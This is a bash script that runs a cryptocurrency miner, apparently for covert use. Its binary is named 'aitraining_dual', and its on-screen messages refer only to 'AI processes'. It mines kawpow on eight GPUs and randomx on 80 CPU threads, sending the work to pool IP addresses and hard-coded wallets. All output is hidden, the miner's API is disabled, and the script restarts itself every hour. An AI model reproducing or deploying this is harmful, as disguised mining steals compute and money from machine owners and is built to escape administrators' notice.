#!/bin/bash

# Function to print CPU and GPU usage
print_usage() {
    # Get CPU usage percentage
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    
    # Get GPU usage percentage for each GPU and calculate average
    local gpu_usage=0
    local gpu_count=0
    
    # Check if nvidia-smi is available
    if command -v nvidia-smi &> /dev/null; then
        # Get GPU usage for all GPUs
        while read -r line; do
            if [[ $line =~ ([0-9]+)% ]]; then
                local usage=${BASH_REMATCH[1]}
                gpu_usage=$((gpu_usage + usage))
                gpu_count=$((gpu_count + 1))
            fi
        done < <(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null)
        
        if [ $gpu_count -gt 0 ]; then
            local avg_gpu_usage=$((gpu_usage / gpu_count))
            printf "\rCPU: %3d%% | GPU: %3d%% | Time: %s" "$cpu_usage" "$avg_gpu_usage" "$(date +%H:%M:%S)"
        else
            printf "\rCPU: %3d%% | GPU: N/A | Time: %s" "$cpu_usage" "$(date +%H:%M:%S)"
        fi
    else
        printf "\rCPU: %3d%% | GPU: N/A | Time: %s" "$cpu_usage" "$(date +%H:%M:%S)"
    fi
}

# Function to start mining processes
start_mining() {
    # Clean old processes
    pkill -f aitraining_dual 2>/dev/null || true
    sleep 2

    # Start GPU process with nohup and no output
    nohup ./aitraining_dual \
        --algorithm kawpow \
        --pool stratum+ssl://51.89.99.172:16161 \
        --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
        --worker H200-g \
        --password x \
        --gpu-id 0,1,2,3,4,5,6,7 \
        --tls true \
        --disable-cpu \
        --api-disable > /dev/null 2>&1 &
    GPU_PID=$!

    # Start CPU process with nohup and no output
    nohup ./aitraining_dual \
        --algorithm randomx \
        --pool stratum+ssl://51.222.200.133:10343 \
        --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
        --worker H200-c \
        --password x \
        --cpu-threads 80 \
        --disable-gpu \
        --tls true \
        --api-disable > /dev/null 2>&1 &
    CPU_PID=$!

    echo "Started processes: GPU_PID=$GPU_PID, CPU_PID=$CPU_PID"
}

# Function to stop mining processes
stop_mining() {
    echo -e "\nStopping AI processes..."
    kill $GPU_PID 2>/dev/null || true
    kill $CPU_PID 2>/dev/null || true
    
    # Wait for processes to terminate
    wait $GPU_PID 2>/dev/null || true
    wait $CPU_PID 2>/dev/null || true
    
    # Ensure no processes are left
    pkill -f aitraining_dual 2>/dev/null || true
    sleep 2
}

# Clear screen and show header
clear
echo "Processes run for 1 hour, then pause 1 minute"
echo "Press Ctrl+C to stop"
echo "======================================"

# Main loop
while true; do
    # Start mining processes
    start_mining
    
    # Get current time
    start_time=$(date +%s)
    
    # Run for 1 hour, showing usage stats
    while true; do
        current_time=$(date +%s)
        elapsed=$((current_time - start_time))
        
        # Break after 1 hour (3600 seconds)
        if [ $elapsed -ge 3600 ]; then
            break
        fi
        
        # Print usage statistics
        print_usage
        
        # Sleep for 2 seconds between updates
        sleep 2
    done
    
    stop_mining
    
    # Show pause message
    echo -e "\nPausing for 1 minute..."
    
    # Countdown for 1 minute
    for i in {60..1}; do
        printf "\rResuming in: %02d seconds" "$i"
        sleep 1
    done
    
done
